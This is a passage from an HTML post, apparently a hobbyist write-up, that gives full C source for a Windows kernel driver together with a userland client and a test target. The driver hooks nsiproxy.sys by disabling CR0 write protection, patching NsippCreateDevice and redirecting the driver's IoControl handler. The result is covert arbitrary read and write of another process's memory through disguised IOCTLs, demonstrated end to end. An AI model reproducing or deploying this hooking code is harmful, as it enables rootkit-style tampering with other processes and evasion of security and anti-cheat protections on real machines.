/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(NT_SUCCESS(status))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;+&nbsp;WRITE&nbsp;SUCCESS&nbsp;[bytes_returned]&nbsp;%lld&nbsp;\n&quot;,&nbsp;bytes_ret);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;-&nbsp;WRITE&nbsp;FAILURE.&nbsp;NTSTATUS&nbsp;ERROR&nbsp;0x%x&nbsp;\n&quot;,&nbsp;status);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ObDereferenceObject(target_proc);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Irp-&gt;IoStatus.Status&nbsp;=&nbsp;status;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Irp-&gt;IoStatus.Information&nbsp;=&nbsp;sizeof(write);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IoCompleteRequest(Irp,&nbsp;IO_NO_INCREMENT);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;STATUS_SUCCESS;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;If&nbsp;it&#39;s&nbsp;not&nbsp;a&nbsp;control&nbsp;code&nbsp;we&#39;ve&nbsp;sent,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;return&nbsp;to&nbsp;the&nbsp;nsiproxy.sys&#39;s&nbsp;IoControl&nbsp;function<br />&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;*&nbsp;Retruning&nbsp;to&nbsp;original&nbsp;nsiproxy.sys&#39;s&nbsp;IoControl&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;nsiproxy_IoControl(DeviceObject,&nbsp;Irp);<br />}<br /><br />void&nbsp;DriverUnload(PDRIVER_OBJECT&nbsp;DriverObject)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Don&#39;t&nbsp;know&nbsp;if&nbsp;this&nbsp;will&nbsp;actually&nbsp;do&nbsp;anything?<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;But&nbsp;it&nbsp;means&nbsp;it&nbsp;has&nbsp;an&nbsp;unload&nbsp;routine&nbsp;so&nbsp;can&nbsp;actually&nbsp;unload&nbsp;with&nbsp;OSR<br />&nbsp;&nbsp;&nbsp;&nbsp;UNREFERENCED_PARAMETER(DriverObject);<br />&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;Unloaded&nbsp;driver&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;return;<br />}<br /><br />NTSTATUS&nbsp;DriverEntry(PDRIVER_OBJECT&nbsp;DriverObject,&nbsp;PUNICODE_STRING&nbsp;RegistryPath)<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;UNREFERENCED_PARAMETER(RegistryPath);<br />&nbsp;&nbsp;&nbsp;&nbsp;NTSTATUS&nbsp;status&nbsp;=&nbsp;STATUS_SUCCESS;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;DriverObject-&gt;DriverUnload&nbsp;=&nbsp;DriverUnload;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;nsiproxy_base&nbsp;=&nbsp;FindModuleBase(&quot;nsiproxy.sys&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(nsiproxy_base&nbsp;==&nbsp;NULL)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;-&nbsp;Failed&nbsp;to&nbsp;find&nbsp;module&nbsp;base&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0x0;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;+&nbsp;Found&nbsp;module&nbsp;base:&nbsp;nsiproxy.sys&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;nsiproxy_base);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Find&nbsp;start&nbsp;of&nbsp;NsippCreateDevice&nbsp;function&nbsp;in&nbsp;nsiproxy.sys<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;addr_NsippCreateDevice&nbsp;=&nbsp;FindPatternInModule(<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nsiproxy_base,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x48\x89\x5C\x24\x00\x48\x89\x74\x24\x00\x55\x57\x41\x56\x48\x8D\x6C\x24\x00\x48\x81\xEC\x00\x00\x00\x00\x48\x8B\x05&quot;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;xxxx?xxxx?xxxxxxxx?xxx????xxx&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br />&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;+&nbsp;Found&nbsp;NsippCreateDevice&nbsp;in&nbsp;nsiproxy.sys&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;addr_NsippCreateDevice);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Grab&nbsp;the&nbsp;nsiproxy.sys&nbsp;driver<br />&nbsp;&nbsp;&nbsp;&nbsp;UNICODE_STRING&nbsp;driver_name&nbsp;=&nbsp;RTL_CONSTANT_STRING(L&quot;\\Driver\\nsiproxy&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;PDRIVER_OBJECT&nbsp;nsiproxy_obj&nbsp;=&nbsp;NULL;<br />&nbsp;&nbsp;&nbsp;&nbsp;extern&nbsp;POBJECT_TYPE*&nbsp;IoDriverObjectType;<br />&nbsp;&nbsp;&nbsp;&nbsp;status&nbsp;=&nbsp;ObReferenceObjectByName(<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;driver_name,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OBJ_CASE_INSENSITIVE,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;0,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*IoDriverObjectType,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KernelMode,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(PVOID*)&amp;nsiproxy_obj<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!NT_SUCCESS(status))<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;-&nbsp;ObReferenceOBjectByName&nbsp;failed:&nbsp;0x%x&nbsp;(%wZ)&nbsp;\n&quot;,&nbsp;status,&nbsp;driver_name);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0x0;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;if&nbsp;(nsiproxy_obj&nbsp;==&nbsp;NULL)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;-&nbsp;Failed&nbsp;to&nbsp;grab&nbsp;%wZ&nbsp;object&nbsp;\n&quot;,&nbsp;driver_name);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0x0;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;+&nbsp;Grabbed&nbsp;nsiproxy.sys&nbsp;object&nbsp;\n&quot;);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Grab&nbsp;address&nbsp;of&nbsp;nsiproxy.sys&#39;s&nbsp;IO&nbsp;control&nbsp;function<br />&nbsp;&nbsp;&nbsp;&nbsp;addr_nsiproxy_IoControl&nbsp;=&nbsp;(PVOID)nsiproxy_obj-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL];<br />&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;*&nbsp;nsiproxy.sys&nbsp;IoControl&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;addr_nsiproxy_IoControl);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Build&nbsp;hook<br />&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;hook[16]&nbsp;=<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x50,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;push&nbsp;rax<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x48,&nbsp;0xB8,&nbsp;0x00,&nbsp;0x00,&nbsp;0x00,&nbsp;0x00,&nbsp;0x00,&nbsp;0x00,&nbsp;0x00,&nbsp;0x00,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;movbs&nbsp;rax,&nbsp;&lt;64bit&nbsp;address&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x48,&nbsp;0x87,&nbsp;0x04,&nbsp;0x24,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;xchg&nbsp;qword&nbsp;ptr&nbsp;[rsp],&nbsp;rax<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xC3,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;ret<br />&nbsp;&nbsp;&nbsp;&nbsp;};<br />&nbsp;&nbsp;&nbsp;&nbsp;DWORD64&nbsp;x64_addr&nbsp;=&nbsp;(DWORD64)IoControl;<br />&nbsp;&nbsp;&nbsp;&nbsp;memcpy_s(hook&nbsp;+&nbsp;3,&nbsp;8,&nbsp;&amp;x64_addr,&nbsp;8);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;_disable();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Disable&nbsp;interrupts<br />&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;long&nbsp;cr0&nbsp;=&nbsp;__readcr0();&nbsp;&nbsp;&nbsp;//&nbsp;Save&nbsp;value&nbsp;in&nbsp;cr0&nbsp;register<br />&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;long&nbsp;orig_cr0&nbsp;=&nbsp;cr0;<br />&nbsp;&nbsp;&nbsp;&nbsp;cr0&nbsp;&amp;=&nbsp;~(1UL&nbsp;&lt;&lt;&nbsp;16);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Disable&nbsp;write&nbsp;protection&nbsp;bit&nbsp;in&nbsp;CR0<br />&nbsp;&nbsp;&nbsp;&nbsp;__writecr0(cr0);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Install&nbsp;hook&nbsp;@&nbsp;target&nbsp;function<br />&nbsp;&nbsp;&nbsp;&nbsp;size_t&nbsp;hook_len&nbsp;=&nbsp;strlen(hook);<br />&nbsp;&nbsp;&nbsp;&nbsp;memcpy_s(addr_NsippCreateDevice,&nbsp;hook_len,&nbsp;hook,&nbsp;hook_len);<br />&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;+&nbsp;Installed&nbsp;hook&nbsp;in&nbsp;NsippCreateDevice&nbsp;(0x%p)&nbsp;to&nbsp;IoControl&nbsp;(0x%p)&nbsp;\n&quot;,&nbsp;addr_NsippCreateDevice,&nbsp;IoControl);<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;__writecr0(orig_cr0);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Restore&nbsp;CR0&nbsp;register<br />&nbsp;&nbsp;&nbsp;&nbsp;_enable();<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Modify&nbsp;nsiproxy&#39;s&nbsp;IoControl&nbsp;function&nbsp;to&nbsp;be&nbsp;the&nbsp;function&nbsp;we&nbsp;hooked&nbsp;-&nbsp;NsippCreateDevice<br />&nbsp;&nbsp;&nbsp;&nbsp;nsiproxy_obj-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL]&nbsp;=&nbsp;(PDRIVER_DISPATCH)addr_NsippCreateDevice;<br />&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;+&nbsp;Detoured&nbsp;nsiproxy.sys&nbsp;IoControl&nbsp;to&nbsp;NsippCreateDevice&nbsp;(0x%p)&nbsp;\n&quot;,&nbsp;addr_NsippCreateDevice);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;status;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><h3>### Userland</h3><br />This is the userland component that opens and sends IO codes to nsiproxy.sys.<br />It&#39;s a simple kernel read/write with MmCopyVirtualMemory.<br />Compiled as x64.<br />Make sure to change the process ID nand read/write addresses accordingly from the test program.<br /><div class="codebox"><div class="codebox">/*<br />RUN&nbsp;AS&nbsp;ADMINISTRATOR!<br />*/<br />#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;stdbool.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />HANDLE&nbsp;g_hDriver&nbsp;=&nbsp;NULL;<br />#define&nbsp;IOCTL_YOINKED_READ_MEMORY&nbsp;CTL_CODE(FILE_DEVICE_UNKNOWN,&nbsp;0x801,&nbsp;METHOD_BUFFERED,&nbsp;FILE_ANY_ACCESS)<br />#define&nbsp;IOCTL_YOINKED_WRITE_MEMORY&nbsp;CTL_CODE(FILE_DEVICE_UNKNOWN,&nbsp;0X802,&nbsp;METHOD_BUFFERED,&nbsp;FILE_ANY_ACCESS)<br /><br />typedef&nbsp;struct&nbsp;_KERNEL_READ<br />{<br />	DWORD32&nbsp;process_id;<br />	PVOID&nbsp;from;<br />	PVOID&nbsp;to;<br />	SIZE_T&nbsp;size;<br />}&nbsp;KernelRead;<br /><br />typedef&nbsp;struct&nbsp;_KERNEL_WRITE<br />{<br />	DWORD32&nbsp;process_id;<br />	PVOID&nbsp;data_addr;<br />	PVOID&nbsp;to;<br />	SIZE_T&nbsp;data_size;<br />}&nbsp;KernelWrite;<br /><br />bool&nbsp;kernel_ReadMemory(DWORD32&nbsp;process_id,&nbsp;void*&nbsp;addr,&nbsp;void*&nbsp;out_buf,&nbsp;SIZE_T&nbsp;size)<br />{<br />	bool&nbsp;ok&nbsp;=&nbsp;false;<br />	void*&nbsp;tmp_buf&nbsp;=&nbsp;malloc(size);		//&nbsp;Allocate&nbsp;tmp&nbsp;space&nbsp;to&nbsp;store&nbsp;returned&nbsp;data<br />	DWORD&nbsp;bytes_ret&nbsp;=&nbsp;0;<br /><br />	//&nbsp;Build&nbsp;read&nbsp;request<br />	KernelRead&nbsp;read&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	read.process_id&nbsp;=&nbsp;process_id;<br />	read.from&nbsp;=&nbsp;addr;<br />	read.to&nbsp;=&nbsp;tmp_buf;<br />	read.size&nbsp;=&nbsp;size;<br /><br />	//&nbsp;Send&nbsp;read&nbsp;to&nbsp;kernel&nbsp;driver.&nbsp;Read&nbsp;bytes&nbsp;will&nbsp;be&nbsp;returned&nbsp;into&nbsp;tmp_buf<br />	BOOL&nbsp;b&nbsp;=&nbsp;DeviceIoControl(g_hDriver,&nbsp;IOCTL_YOINKED_READ_MEMORY,<br />		&amp;read,&nbsp;sizeof(read),<br />		&amp;read,&nbsp;sizeof(read),<br />		&amp;bytes_ret,<br />		NULL);<br />	if&nbsp;(b&nbsp;==&nbsp;TRUE)<br />	{<br />		//&nbsp;Copy&nbsp;returned&nbsp;data&nbsp;into&nbsp;out_buf<br />		memcpy_s(out_buf,&nbsp;size,&nbsp;tmp_buf,&nbsp;size);<br />		ok&nbsp;=&nbsp;true;<br />	}<br /><br />	free(tmp_buf);<br />	return&nbsp;ok;<br />}<br /><br />bool&nbsp;kernel_WriteMemory(DWORD32&nbsp;process_id,&nbsp;void*&nbsp;write_addr,&nbsp;void*&nbsp;data_addr,&nbsp;SIZE_T&nbsp;data_size)<br />{<br />	bool&nbsp;ok&nbsp;=&nbsp;false;<br />	DWORD&nbsp;bytes_ret&nbsp;=&nbsp;0;<br /><br />	//&nbsp;Build&nbsp;write&nbsp;request<br />	KernelWrite&nbsp;write&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	write.process_id&nbsp;=&nbsp;process_id;<br />	write.to&nbsp;=&nbsp;write_addr;<br />	write.data_addr&nbsp;=&nbsp;data_addr;<br />	write.data_size&nbsp;=&nbsp;data_size;<br /><br />	//&nbsp;Send&nbsp;write&nbsp;request&nbsp;to&nbsp;kernel&nbsp;driver<br />	BOOL&nbsp;b&nbsp;=&nbsp;DeviceIoControl(g_hDriver,&nbsp;IOCTL_YOINKED_WRITE_MEMORY,<br />		&amp;write,&nbsp;sizeof(write),<br />		&amp;write,&nbsp;sizeof(write),<br />		&amp;bytes_ret,<br />		NULL);<br />	if&nbsp;(b&nbsp;==&nbsp;TRUE)<br />		ok&nbsp;=&nbsp;true;<br /><br />	return&nbsp;ok;<br />}<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;wchar_t&nbsp;driver_name[]&nbsp;=&nbsp;L&quot;\\\\.\\nsi&quot;;<br />&nbsp;&nbsp;&nbsp;&nbsp;g_hDriver&nbsp;=&nbsp;CreateFileW(<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;driver_name,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GENERIC_ALL,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE_SHARE_READ&nbsp;|&nbsp;FILE_SHARE_WRITE,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPEN_EXISTING,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE_ATTRIBUTE_SYSTEM,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(g_hDriver&nbsp;==&nbsp;INVALID_HANDLE_VALUE)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;-&nbsp;Failed&nbsp;to&nbsp;open&nbsp;driver:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;-&nbsp;(if&nbsp;5,&nbsp;run&nbsp;as&nbsp;Administrator!)&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />	DWORD32&nbsp;target_pid&nbsp;=&nbsp;16592;<br />	int&nbsp;value&nbsp;=&nbsp;0;<br />	kernel_ReadMemory(target_pid,&nbsp;(void*)0x0000002AD858FB64,&nbsp;&amp;value,&nbsp;sizeof(int));<br />	printf(&quot;%d&nbsp;\n&quot;,&nbsp;value);<br /><br />	int&nbsp;new_value&nbsp;=&nbsp;145;<br />	kernel_WriteMemory(target_pid,&nbsp;(void*)0x0000002AD858FB64,&nbsp;&amp;new_value,&nbsp;sizeof(new_value));<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><h3>### Test program</h3><br />Here is the demo program I&#39;m testing read/write against.<br />It&#39;s an infinite loop that prints out a number.<br />Compiled as x64.<br /><div class="codebox"><div class="codebox">/*<br />A&nbsp;test&nbsp;program&nbsp;to&nbsp;read&nbsp;data&nbsp;from&nbsp;and&nbsp;write&nbsp;data&nbsp;to<br />from&nbsp;the&nbsp;kernel.<br />*/<br />#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;num&nbsp;=&nbsp;562;<br />&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(1)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;[process&nbsp;id]&nbsp;%d&nbsp;\n&quot;,&nbsp;GetCurrentProcessId());<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Read&nbsp;and&nbsp;write&nbsp;to&nbsp;this&nbsp;value.&nbsp;Loop&nbsp;again&nbsp;to&nbsp;see&nbsp;changes.<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;[num]&nbsp;%d&nbsp;[addr]&nbsp;0x%p&quot;,&nbsp;num,&nbsp;&amp;num);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;n&nbsp;=&nbsp;getchar();<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><h2>## Demo</h2><br />I install the driver with OSR loader (with test signing enabled)<br />and run my userland program to interface with nsiproxy.sys.<br /><br />It successfully runs!<br /><br />This is the output from WinDbg (I was remote debugging the machine)<br />You can see the read request and write request.<br /><a href=""><img src="images/1821-2.png" alt="images/1821-2.png" /></a><br /><br />And here is the modified number in the test process.<br /><a href=""><img src="images/1821-3.png" alt="images/1821-3.png" /></a></div>
</body>
</html>
